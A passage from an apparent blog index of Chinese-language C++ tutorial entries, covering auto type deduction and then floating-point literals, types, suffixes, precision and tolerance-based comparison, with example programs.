bool</span></span><br><span class="line">    <span class="keyword">auto</span> ll = <span class="number">1234567890L</span>L; <span class="comment">// ll 被推断为 long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of i: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(i).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of d: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(d).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of f: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(f).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of ll: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(ll).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 推断表达式结果类型</span></span><br><span class="line">    <span class="keyword">auto</span> sum = i + d; <span class="comment">// i(int) + d(double) -&gt; double, sum 被推断为 double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of sum: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(sum).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sum = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 推断 const 和引用 (需要显式添加)</span></span><br><span class="line">    <span class="keyword">int</span> original = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">auto</span> copy = original;         <span class="comment">// copy 是 int (非引用, 非 const)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span> const_copy = original; <span class="comment">// const_copy 是 const int</span></span><br><span class="line">    <span class="keyword">auto</span>&amp; ref = original;         <span class="comment">// ref 是 int&amp; (引用)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span>&amp; const_ref = original; <span class="comment">// const_ref 是 const int&amp; (const 引用)</span></span><br><span class="line"></span><br><span class="line">    copy = <span class="number">200</span>; <span class="comment">// OK</span></span><br><span class="line">    <span class="comment">// const_copy = 200; // 错误! const_copy 是 const</span></span><br><span class="line">    ref = <span class="number">300</span>; <span class="comment">// OK, original 也变为 300</span></span><br><span class="line">    <span class="comment">// const_ref = 400; // 错误! const_ref 是 const 引用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;original: &quot;</span> &lt;&lt; original &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 300</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于复杂类型 (例如 STL 容器迭代器)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; names = &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">auto</span> it = names.begin(); <span class="comment">// it 被推断为 std::vector&lt;std::string&gt;::iterator</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First name: &quot;</span> &lt;&lt; *it &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of it: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(it).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 列表初始化</span></span><br><span class="line">    <span class="keyword">auto</span> list1 = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;; <span class="comment">// list1 是 std::initializer_list&lt;int&gt;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of list1: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(list1).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++17 列表初始化 (无等号)</span></span><br><span class="line">    <span class="comment">// auto val&#123;42&#125;; // C++17: val 是 int</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Type of val: &quot; &lt;&lt; typeid(val).name() &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点:</strong></p><ul><li>  减少冗余代码，尤其是在类型名称很长时。</li><li>  提高代码的可维护性，如果初始化表达式的类型改变，<code>auto</code> 变量的类型会自动更新。</li><li>  有助于泛型编程。</li></ul><p><strong>缺点/注意事项:</strong></p><ul><li>  过度使用可能降低代码的可读性，因为读者需要查看初始化表达式才能确定类型。</li><li>  <code>auto</code> 推断出的类型可能不是你期望的（例如，忘记添加 <code>&amp;</code> 得到副本而不是引用）。</li><li>  对于代理类（Proxy Classes），<code>auto</code> 可能推断出代理类型而不是期望的值类型，需要小心。</li></ul><p><strong>建议:</strong> 在类型冗长、明显或无关紧要时使用 <code>auto</code> 可以提高效率。在类型对于理解代码逻辑很重要时，显式写出类型可能更好。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3.3 浮点数</title>
      <link href="2025/04/26/3.3_%E6%B5%AE%E7%82%B9%E6%95%B0/"/>
      <url>2025/04/26/3.3_%E6%B5%AE%E7%82%B9%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>浮点数是C++中用于表示带小数部分的数字（实数）的类型。它们可以表示非常大或非常小的数值，以及整数无法表示的小数。</p><h2 id="3-3-1-书写浮点数"><a href="#3-3-1-书写浮点数" class="headerlink" title="3.3.1 书写浮点数"></a>3.3.1 书写浮点数</h2><p>C++允许使用两种方式来书写浮点字面值（常量）：</p><ol><li><p><strong>标准小数点表示法 (Standard Decimal Point Notation):</strong></p><ul><li>  包含一个小数点。</li><li>  例如：<code>12.34</code>, <code>0.0</code>, <code>99.</code>, <code>.5</code> (等同于 0.5), <code>-1.67</code>。</li></ul></li><li><p><strong>E表示法 (E Notation) 或科学记数法 (Scientific Notation):</strong></p><ul><li>  用于表示非常大或非常小的数。</li><li>  格式为：<code>mantissaEexponent</code> 或 <code>mantissaeexponent</code>。</li><li>  <code>mantissa</code> (尾数) 是一个数字（可以带小数点）。</li><li>  <code>E</code> 或 <code>e</code> 表示 “乘以10的…次幂”。</li><li>  <code>exponent</code> (指数) 是一个整数（可以为负）。</li><li>例如：<ul><li>  <code>3.45E6</code> 表示 3.45 * 10<sup>6</sup> (即 3,450,000)。</li><li>  <code>2.5e-4</code> 表示 2.5 * 10<sup>-4</sup> (即 0.00025)。</li><li>  <code>9E12</code> 表示 9 * 10<sup>12</sup>。</li><li>  <code>-1.23e+3</code> 表示 -1.23 * 10<sup>3</sup> (即 -1230)。</li></ul></li></ul></li></ol><p><strong>注意:</strong></p><ul><li>  E表示法中，<code>E</code> 或 <code>e</code> 前后不能有空格。</li><li>  指数必须是整数。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 标准小数点表示法</span></span><br><span class="line">    <span class="keyword">double</span> price = <span class="number">99.99</span>;</span><br><span class="line">    <span class="keyword">double</span> temperature = <span class="number">-15.5</span>;</span><br><span class="line">    <span class="keyword">double</span> small_fraction = <span class="number">.25</span>; <span class="comment">// 等同于 0.25</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// E 表示法</span></span><br><span class="line">    <span class="keyword">double</span> earth_mass = <span class="number">5.972E24</span>; <span class="comment">// 地球质量 (kg)</span></span><br><span class="line">    <span class="keyword">double</span> electron_charge = <span class="number">-1.602e-19</span>; <span class="comment">// 电子电荷 (库仑)</span></span><br><span class="line">    <span class="keyword">double</span> large_number = <span class="number">1.0e9</span>; <span class="comment">// 10 亿</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Temperature: &quot;</span> &lt;&lt; temperature &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Small fraction: &quot;</span> &lt;&lt; small_fraction &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 默认情况下，cout 可能对非常大或小的数自动使用科学记数法输出</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Earth mass: &quot;</span> &lt;&lt; earth_mass &lt;&lt; <span class="string">&quot; kg&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Electron charge: &quot;</span> &lt;&lt; electron_charge &lt;&lt; <span class="string">&quot; C&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Large number: &quot;</span> &lt;&lt; large_number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 可以使用 &lt;iomanip&gt; 控制输出格式 (后续章节会详细介绍)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios_base::fixed, <span class="built_in">std</span>::ios_base::floatfield); <span class="comment">// 设置为定点表示法</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Large number (fixed): &quot;</span> &lt;&lt; large_number &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-3-2-浮点类型"><a href="#3-3-2-浮点类型" class="headerlink" title="3.3.2 浮点类型"></a>3.3.2 浮点类型</h2><p>C++提供了三种浮点类型，它们在精度（有效位数）和存储范围上有所不同：</p><ol><li> <strong><code>float</code>:</strong> 单精度浮点数。通常占用 4 个字节 (32位)。精度较低，范围较小。</li><li> <strong><code>double</code>:</strong> 双精度浮点数。通常占用 8 个字节 (64位)。精度和范围比 <code>float</code> 大很多。这是C++中最常用的浮点类型，浮点常量（如 <code>3.14</code>）默认就是 <code>double</code> 类型。</li><li> <strong><code>long double</code>:</strong> 扩展精度浮点数。通常占用 8、10、12 或 16 个字节，具体取决于编译器和系统。提供最高的精度和最大的范围。</li></ol><p><strong>精度和范围:</strong></p><ul><li><strong>精度 (Precision):</strong> 指的是可以表示的有效数字的位数。<ul><li>  <code>float</code> 通常保证至少 6 位有效数字。</li><li>  <code>double</code> 通常保证至少 15 位有效数字。</li><li>  <code>long double</code> 通常提供比 <code>double</code> 更高的精度。</li></ul></li><li>  <strong>范围 (Range):</strong> 指的是可以表示的最小和最大数值。<code>double</code> 的范围远大于 <code>float</code>，<code>long double</code> 的范围通常更大。</li></ul><p>可以使用 <code>&lt;cfloat&gt;</code> (或 C 语言的 <code>&lt;float.h&gt;</code>) 头文件中的常量来查看具体系统的精度和范围限制（例如 <code>FLT_DIG</code>, <code>DBL_DIG</code>, <code>LDBL_DIG</code> 表示有效位数）。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cfloat&gt; // 包含浮点数限制信息</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 查看各种类型占用的字节数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of float: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">float</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of double: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">double</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of long double: &quot;</span> &lt;&lt; <span class="keyword">sizeof</span>(<span class="keyword">long</span> <span class="keyword">double</span>) &lt;&lt; <span class="string">&quot; bytes&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查看精度 (有效位数)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for float: &quot;</span> &lt;&lt; FLT_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for double: &quot;</span> &lt;&lt; DBL_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Digits of precision for long double: &quot;</span> &lt;&lt; LDBL_DIG &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 声明和初始化</span></span><br><span class="line">    <span class="keyword">float</span> f_pi = <span class="number">3.14159265f</span>; <span class="comment">// f 后缀表示 float</span></span><br><span class="line">    <span class="keyword">double</span> d_pi = <span class="number">3.141592653589793</span>; <span class="comment">// 默认是 double</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">double</span> ld_pi = <span class="number">3.14159265358979323846L</span>; <span class="comment">// L 后缀表示 long double</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span>.precision(<span class="number">20</span>); <span class="comment">// 设置 cout 输出精度以便观察差异</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;float pi:       &quot;</span> &lt;&lt; f_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;double pi:      &quot;</span> &lt;&lt; d_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;long double pi: &quot;</span> &lt;&lt; ld_pi &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>选择建议:</strong></p><ul><li>  除非有特别的内存或性能考虑，并且确定 <code>float</code> 的精度足够，否则**优先使用 <code>double</code>**。它是C++浮点计算的常用类型。</li><li>  当需要极高的精度或非常大的数值范围时，使用 <code>long double</code>。</li></ul><h2 id="3-3-3-浮点常量"><a href="#3-3-3-浮点常量" class="headerlink" title="3.3.3 浮点常量"></a>3.3.3 浮点常量</h2><p>浮点常量（字面值）就是直接写在代码中的浮点数值，例如 <code>3.14</code>, <code>1.0</code>, <code>-2.5e8</code>。</p><p><strong>默认类型:</strong><br>默认情况下，C++将不带后缀的浮点常量视为 <code>double</code> 类型。</p><p><strong>后缀 (Suffixes):</strong><br>可以通过添加后缀来显式指定浮点常量的类型：</p><ul><li>  <code>f</code> 或 <code>F</code>: 表示 <code>float</code> 类型。</li><li>  <code>l</code> 或 <code>L</code>: 表示 <code>long double</code> 类型。</li></ul><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // 用于 typeid (仅作演示)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 默认类型是 double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 1.0e-5: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">1.0e-5</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用后缀指定类型</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14f: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14f</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// float</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14F: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14F</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// float</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14l: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14l</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// long double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of 3.14L: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(<span class="number">3.14L</span>).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// long double</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 赋值时的类型匹配</span></span><br><span class="line">    <span class="keyword">float</span> price = <span class="number">99.99f</span>; <span class="comment">// 使用 f 后缀避免从 double 到 float 的可能精度损失警告</span></span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">75.5</span>; <span class="comment">// 75.5 是 double, 赋值给 double 变量</span></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">double</span> distance = <span class="number">1.23e10</span>L; <span class="comment">// 使用 L 后缀</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Price: &quot;</span> &lt;&lt; price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Distance: &quot;</span> &lt;&lt; distance &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><em>(注意: <code>typeid().name()</code> 的输出可能因编译器而异，但可以大致看出类型)</em></p><p>在将常量赋给 <code>float</code> 变量时，使用 <code>f</code> 或 <code>F</code> 后缀是一个好习惯，可以避免编译器产生关于从 <code>double</code> 转换到 <code>float</code> 可能丢失精度的警告。</p><h2 id="3-3-4-浮点数的优缺点"><a href="#3-3-4-浮点数的优缺点" class="headerlink" title="3.3.4 浮点数的优缺点"></a>3.3.4 浮点数的优缺点</h2><p>浮点数在表示实数方面非常有用，但也存在一些固有的限制和需要注意的地方。</p><p><strong>优点:</strong></p><ol><li> <strong>表示范围广:</strong> 可以表示比整型大得多或小得多的数值。</li><li> <strong>表示小数:</strong> 可以表示整数无法表示的小数部分。</li><li> <strong>标准化:</strong> 大多数现代计算机都遵循 IEEE 754 标准来表示和处理浮点数，这提高了可移植性。</li></ol><p><strong>缺点:</strong></p><ol><li> <strong>精度限制:</strong> 浮点数只能<strong>近似</strong>地表示大多数实数。由于内部使用二进制表示，某些在十进制下看起来很精确的小数（如 0.1）在二进制浮点表示中可能是无限循环小数，只能存储一个近似值。这会导致微小的**舍入误差 (Rounding Error)**。</li><li> <strong>比较困难:</strong> 由于精度限制，直接使用 <code>==</code> 来比较两个浮点数是否相等通常是不可靠的。微小的舍入误差可能导致逻辑上应该相等的两个数在内部表示上略有不同。比较浮点数时，通常应该检查它们的差值是否在一个很小的<strong>容差 (Tolerance)</strong> 范围内。</li><li> <strong>运算速度:</strong> 浮点运算通常比整型运算慢（尽管现代处理器有专门的浮点单元来优化）。</li><li> <strong>特殊值:</strong> IEEE 754 标准定义了一些特殊值，如 <code>NaN</code> (Not a Number，例如 0.0/0.0 的结果) 和无穷大 (<code>Infinity</code>，例如 1.0/0.0 的结果)，需要在使用时注意处理。</li></ol><p><strong>用法与示例 (精度问题和比较):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;   // 为了 fabs (计算绝对值)</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt; // 为了 setprecision</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 精度问题示例</span></span><br><span class="line">    <span class="keyword">double</span> a = <span class="number">0.1</span>;</span><br><span class="line">    <span class="keyword">double</span> b = <span class="number">0.2</span>;</span><br><span class="line">    <span class="keyword">double</span> sum = a + b; <span class="comment">// 理论上应该是 0.3</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::setprecision(<span class="number">20</span>); <span class="comment">// 显示更多小数位</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a + b = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出可能不是精确的 0.3</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sum == <span class="number">0.3</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (==): sum is equal to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (==): sum is NOT equal to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 很可能执行这里</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 正确的比较方法：检查差值是否在容差范围内</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> TOLERANCE = <span class="number">1e-9</span>; <span class="comment">// 定义一个很小的容差值</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">std</span>::<span class="built_in">fabs</span>(sum - <span class="number">0.3</span>) &lt; TOLERANCE) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (tolerance): sum is close enough to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 应该执行这里</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Comparison (tolerance): sum is NOT close enough to 0.3&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 另一个例子</span></span><br><span class="line">    <span class="keyword">float</span> x = <span class="number">1.0f</span> / <span 